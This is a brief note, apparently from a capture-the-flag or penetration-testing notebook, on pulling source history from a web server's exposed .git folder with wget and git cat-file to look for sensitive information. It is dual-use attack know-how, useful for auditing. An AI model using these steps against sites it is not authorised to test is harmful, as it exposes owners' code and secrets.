If we find the .git folder, we can access all commits so maybe important informations !
First add .git at the end of url > status 200 : OK
Get the content with  :"wget -r url/.git"
Now access to refs/heads/master to get master branch > hashcode (or using git log cmd)
Now we can get the content of branch with cmd : "git cat-file -p object-hash" (or using git show object-hash)
